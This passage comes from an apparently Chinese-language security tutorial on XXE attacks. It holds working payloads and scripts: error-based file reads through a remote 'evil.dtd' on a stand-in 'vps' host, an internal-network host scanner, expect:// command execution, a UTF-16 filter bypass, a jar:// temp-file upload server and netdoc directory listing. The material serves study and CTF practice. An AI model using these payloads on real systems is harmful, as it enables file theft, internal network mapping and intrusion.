XXE)"></a>基于报错的XXE(Error Based XXE)</h2><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p><p>出网payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;https://vps/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">    %error;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; error SYSTEM &#x27;file:///fakefile/%file;&#x27;&gt;&quot;</span>&gt;</span><br>%start;<br></code></pre></td></tr></table></figure><p>不出网如果可以写文件的话就可以构造本地恶意dtd</p><p>不出网payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///tmp/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&#x27;aaa)&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;error;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ELEMENT aa (bb&#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %local_dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>flag<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&quot;and | or | not | equal | contains | exists | subdomain-of&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">pattern</span> (%<span class="hljs-keyword">condition</span>;)&gt;</span><br></code></pre></td></tr></table></figure><h2 id="探测内网主机与端口"><a href="#探测内网主机与端口" class="headerlink" title="探测内网主机与端口"></a>探测内网主机与端口</h2><p>利用http协议和网页响应时间来判断主机存活</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">XXE</span>(<span class="hljs-params">ip,string</span>):<br>    <span class="hljs-keyword">try</span>:<br>        xml = <span class="hljs-string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="hljs-string">&#x27;&quot;&#x27;</span> + string + <span class="hljs-string">&#x27;&quot;&#x27;</span> + <span class="hljs-string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br>        x = requests.post(<span class="hljs-string">&#x27;http://192.168.91.134/xml.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="hljs-number">5</span>).text<br>        coded_string = x.split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">2</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; [+]&#x27;</span>,ip,<span class="hljs-string">&#x27;Successfully Found !!!&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; [-]&#x27;</span>,ip,<span class="hljs-string">&#x27;Error Not Found !!!&#x27;</span>)<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/xml&#x27;</span>&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">130</span>,<span class="hljs-number">150</span>):<br>        ip = <span class="hljs-string">&#x27;192.168.91.&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>        string = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/&#x27;</span><br>        XXE(ip,string)<br></code></pre></td></tr></table></figure><p>根据返回内容的不同来判断端口是否开启</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.91.149:80&quot;</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">xxe</span> (<span class="hljs-keyword">#PCDATA</span>) &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xxe</span>&gt;</span>666<span class="hljs-tag">&lt;/<span class="hljs-name">xxe</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><p>在安装<code>expect</code>扩展的<code>PHP</code>环境里执行系统命令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">name</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用<code>utf-16</code>编码绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://9b6b0b8a-f306-4372-9f2c-60abfae7b4d4.challenge.ctf.show/&#x27;</span><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;!DOCTYPE convert [</span><br><span class="hljs-string">&lt;!ENTITY % remote SYSTEM &quot;http://vps/evil.dtd&quot;&gt;</span><br><span class="hljs-string">%remote;%int;%send;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br>rep = requests.post(url=url, data=payload)<br><span class="hljs-built_in">print</span>(rep.text)<br></code></pre></td></tr></table></figure><p>或者命令转换编码<code>iconv -f utf8 -t UTF-32LE  1.xml &gt; 2.xml</code>，<code>echo urlencode(file_get_contents(&quot;payload.xml&quot;));</code>读</p><h2 id="jar-x2F-x2F-文件上传"><a href="#jar-x2F-x2F-文件上传" class="headerlink" title="jar:&#x2F;&#x2F; 文件上传"></a>jar:&#x2F;&#x2F; 文件上传</h2><p><code>Java</code>环境下还可以利用<code>jar</code>协议上传文件</p><p><code>jar</code>协议语法，<code>jar:&#123;url&#125;!/&#123;entry&#125;</code>，<code>url</code>是文件的路径，<code>entry</code>是想要解压出来的文件</p><p>jar 协议处理文件的过程：<br>1：下载 jar&#x2F;zip 文件到临时文件中<br>2：提取出我们指定的文件<br>3：删除临时文件</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY  <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;jar:http://ip:port/1.zip!/1.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">convert</span>&gt;</span><span class="hljs-symbol">&amp;remote;</span><span class="hljs-tag">&lt;/<span class="hljs-name">convert</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当<code>1.zip</code>中没有<code>1.php</code>时，<code>java</code>解析器就会报错，说在这个临时文件中找不到这个文件，这样就得到了临时文件的路径，可以利用文件包含等漏洞去进一步利用这个文件，其原理类似于<code>php</code>的<code>phpinfo</code>临时文件包含</p><p>本地搭建一个环境测试：</p><p>main.java，部署在tomcat上，模拟一个存在xxe漏洞的网页</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.w3c.dom.Element;<br><span class="hljs-keyword">import</span> org.w3c.dom.Node;<br><span class="hljs-keyword">import</span> org.w3c.dom.NodeList;<br><span class="hljs-keyword">import</span> org.xml.sax.InputSource;<br><span class="hljs-keyword">import</span> org.w3c.dom.Document;<br><span class="hljs-keyword">import</span> org.xml.sax.SAXException;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilder;<br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;<br><span class="hljs-keyword">import</span> javax.xml.parsers.ParserConfigurationException;<br><br><span class="hljs-meta">@WebServlet(&quot;/xxe&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">main</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">parmeter</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;poc&quot;</span>);<br><br>        <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>        <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            db = dbf.newDocumentBuilder();<br>        &#125; <span class="hljs-keyword">catch</span> (ParserConfigurationException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-type">StringReader</span> <span class="hljs-variable">sr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(parmeter);<br>        <span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(sr);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-type">Element</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> document.getDocumentElement();<br>            <span class="hljs-type">NodeList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> element.getChildNodes();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">iloop</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; iloop &lt; list.getLength(); iloop++) &#123;<br>                <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> list.item(iloop);<br>                <span class="hljs-keyword">if</span> (node.getNodeType() == Node.ELEMENT_NODE) &#123;<br>                    writer.write(node.getNodeName() + <span class="hljs-string">&quot;：&quot;</span><br>                            + node.getTextContent());<br>                &#125;<br>            &#125;<br>            writer.close();<br>        &#125; <span class="hljs-keyword">catch</span> (SAXException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-5.png"></p><p>再用python起个http服务，进行监听</p><p>xxe-jar.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><span class="hljs-keyword">import</span> http.client <span class="hljs-keyword">as</span> httpc<br><br>listen_host = <span class="hljs-string">&#x27;localhost&#x27;</span><br>listen_port = <span class="hljs-number">9999</span><br>jar_file = sys.argv[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JarRequestHandler</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        http_req = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;New connection:&#x27;</span>,self.client_address)<br>        <span class="hljs-keyword">while</span> <span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> http_req:<br>            <span class="hljs-keyword">try</span>:<br>                http_req += self.request.recv(<span class="hljs-number">4096</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Client req:\r\n&#x27;</span>,http_req.decode())<br>                jf = <span class="hljs-built_in">open</span>(jar_file, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>                contents = jf.read()<br>                headers = (<span class="hljs-string">&#x27;&#x27;&#x27;HTTP/1.0 200 OK\r\n&#x27;&#x27;&#x27;</span><br>                <span class="hljs-string">&#x27;&#x27;&#x27;Content-Type: application/java-archive\r\n\r\n&#x27;&#x27;&#x27;</span>)<br>                self.request.sendall(headers.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br>                self.request.sendall(contents[:-<span class="hljs-number">1</span>])<br>                time.sleep(<span class="hljs-number">30</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-number">30</span>)<br>                self.request.sendall(contents[-<span class="hljs-number">1</span>:])<br><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;get error at:&quot;</span>+<span class="hljs-built_in">str</span>(e))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler)<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;waiting for connection...&#x27;</span>)<br>    server_thread = threading.Thread(target=jarserver.serve_forever)<br>    server_thread.daemon = <span class="hljs-literal">True</span><br>    server_thread.start()<br>    server_thread.join()<br></code></pre></td></tr></table></figure><p>执行<code>python xxe-jar.py evil.zip</code></p><p><code>evil.zip</code>就是要上传的文件了，不一定要是<code>zip</code>，但是因为<code>jar</code>协议会对文件进行解包操作，如果不上传<code>zip</code>格式文件在报错里是看不到临时文件路径的，所以需要先正常上传一次<code>zip</code>格式文件获取路径然后再上传其他文件</p><p>访问<code>/xxe</code>，<code>post</code>发<code>payload</code></p><p>获取路径<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-7.png"></p><p>上传文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-8.png"></p><p>监听情况，<code>30</code>是延时了<code>30</code>秒<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-6.png"></p><p>至于为什么要延迟，回到<code>jar</code>协议处理文件的过程，因为最后一步会删除临时文件，所以我们就要考虑如何让这个文件能更长时间的停留在我们的系统之中，解决方法是在文件结尾添加一个垃圾字符，然后发送除了最后一个字节的所有数据后进行<code>sleep</code>，这样实际上已经传完了，但是服务器以为没传完，就暂时不会删除临时文件了</p><h2 id="netdoc-协议"><a href="#netdoc-协议" class="headerlink" title="netdoc 协议"></a>netdoc 协议</h2><p><code>Java</code>中<code>netdoc</code>协议可以替代<code>file</code>协议功能，读文件，同时也可以列目录</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">creds</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;netdoc:///c:/windows/system.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">creds</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;netdoc:///var/www/html/&quot;</span>&gt;</span></span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p>参考：<br><a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞</a><br><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/xxe-%E6%80%BB%E7%BB%93/">XXE 总结</a><br><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a><br><a href="https://xz.aliyun.com/t/8041">从几道CTF题学习Blind XXE</a><br><a href="https://jlkl.github.io/2020/08/24/Java_03/">Java XXE 漏洞</a><br><a href="https://github.com/proudwind/javasec_study/blob/master/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-xxe.md">java代码审计-xxe</a><br><a 